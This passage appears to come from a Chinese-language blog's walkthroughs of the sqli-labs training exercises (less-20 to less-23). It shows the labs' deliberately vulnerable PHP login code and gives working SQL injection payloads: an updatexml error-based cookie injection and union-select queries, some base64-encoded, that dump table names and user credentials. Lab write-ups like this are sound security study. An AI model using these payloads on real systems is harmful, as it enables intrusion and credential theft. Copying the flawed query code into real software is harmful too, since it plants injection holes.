class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">无cookie时 登录部分</span><br><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]); </span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]); </span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"> <span class="variable">$result1</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"> <span class="variable">$row1</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result1</span>);</span><br><span class="line"> <span class="variable">$cookee</span> = <span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$row1</span>)</span><br><span class="line">&#123; </span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$cookee</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"> <span class="title function_ invoke__">header</span> (<span class="string">&#x27;Location: index.php&#x27;</span>); <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"> &#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line">有cookie时 登录部分 </span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>]; </span><br><span class="line"><span class="variable">$format</span> = <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line"> <span class="variable">$timestamp</span> = <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;YOUR USER AGENT IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;YOUR IP ADDRESS IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;YOUR COOKIE : uname = <span class="subst">$cookee</span> and expires: &quot;</span> . <span class="title function_ invoke__">date</span>(<span class="variable">$format</span>, <span class="variable">$timestamp</span>); <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>; <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"> <span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . <span class="title function_ invoke__">mysql_error</span>()); </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]; </span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>错误的cookie头部POST注入<br>这里因为不是Inser语句 ， 所以在补全SQL语句的时候不需要加,”,”)<br>通过构造cookie<br><code>payload-header:Cookie: uname=admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Sql Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql Lab(21-40)</title>
      <link href="/2019/01/20/sql-lab(21-40)/"/>
      <url>/2019/01/20/sql-lab(21-40)/</url>
      
        <content type="html"><![CDATA[<h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">   &#123;</span><br><span class="line">   <span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))    <span class="comment">// Quote if not a number</span></span><br><span class="line">   &#123;</span><br><span class="line">   <span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">  <span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">  <span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">  <span class="variable">$result1</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">  <span class="variable">$row1</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result1</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$row1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;I LOVE YOU COOKIES&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;   </span><br><span class="line">    <span class="comment">//echo &#x27;Your Cookie is: &#x27; .$cookee;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span> (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">   <span class="variable">$format</span> = <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line">   <span class="variable">$timestamp</span> = <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/Less-21.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#x27;</span>; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;YOUR USER AGENT IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#x27;</span>; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;YOUR IP ADDRESS IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];   </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>;   </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#x27;</span>;   </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;YOUR COOKIE : uname = <span class="subst">$cookee</span> and expires: &quot;</span> . <span class="title function_ invoke__">date</span>(<span class="variable">$format</span>, <span class="variable">$timestamp</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$cookee</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cookee</span>);</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line">   <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">   <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">   <span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . <span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>; </span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">//echo &#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;;</span></span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">  &#125; </span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot; Your Cookie is deleted&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), <span class="title function_ invoke__">time</span>()-<span class="number">3600</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span> (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">  </span><br><span class="line">  &#125;  </span><br></pre></td></tr></table></figure><p>通过查看源码，我们发现这道题不仅加了过滤（check_input），而且需要对cookie:uname进行base 64编码，这样才能匹配<br>测试：<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-14c2900ff6ef6851.png" alt="image.png"><br><code>&#39; union select 1,1,database() #</code><br><code>JyB1bmlvbiBzZWxlY3QgMSwxLGRhdGFiYXNlKCkgIw==</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-f30017cc287ef063.png" alt="image.png"><br>根据报错，源码中是括号中的单引号，故语句应改为<br>爆库<br><code>&#39;) union select 1,1,database() #</code><br><code>JykgdW5pb24gc2VsZWN0IDEsMSxkYXRhYmFzZSgpICM=</code><br>放入burp中，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-eb3f09f9c7451d95.png" alt="image.png"><br>爆表<br><code>&#39;) union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; #</code><br><code>JykgdW5pb24gc2VsZWN0IDEsMSxncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknICM=</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-84cbd8ab8f3bba2c.png" alt="image.png"><br>爆列<br><code>&#39;) union select 1,1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #</code><br><code>JykgdW5pb24gc2VsZWN0IDEsMSxncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnICM=</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-a1dc636dbfc7e661.png" alt="image.png"><br>爆值<br><code>&#39;) union select 1,1,group_concat(username,password) from users#</code><br><code>JykgdW5pb24gc2VsZWN0IDEsMSxncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMj</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-079dfda1292af05d.png" alt="image.png"></p><h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>看了源码发现和less-21差不多，所以这里只需要根据报错提示修改注入语句即可<br>测试<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-105dc6974d0380f7.png" alt="image.png"><br>在burp中输入以上发现报错<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-5b7cf7c5f5870db4.png" alt="image.png"><br>故只需将【”)】改为【”】即可，重复less21的步骤。</p><h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">@<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;</span>; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="keyword">else</span> 